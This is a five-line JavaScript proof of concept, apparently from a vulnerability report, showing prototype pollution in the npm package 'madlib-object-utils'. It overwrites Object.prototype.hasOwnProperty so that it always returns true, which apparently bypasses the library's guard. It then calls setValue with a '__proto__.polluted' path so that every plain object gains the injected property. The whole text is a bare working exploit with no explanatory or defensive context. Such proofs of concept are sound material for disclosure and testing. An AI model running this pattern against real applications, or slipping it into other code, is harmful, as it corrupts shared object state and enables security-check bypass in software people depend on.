Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const objectUtils = require('madlib-object-utils');
objectUtils.setValue('__proto__.polluted', {}, 'yes');
console.log({}.polluted);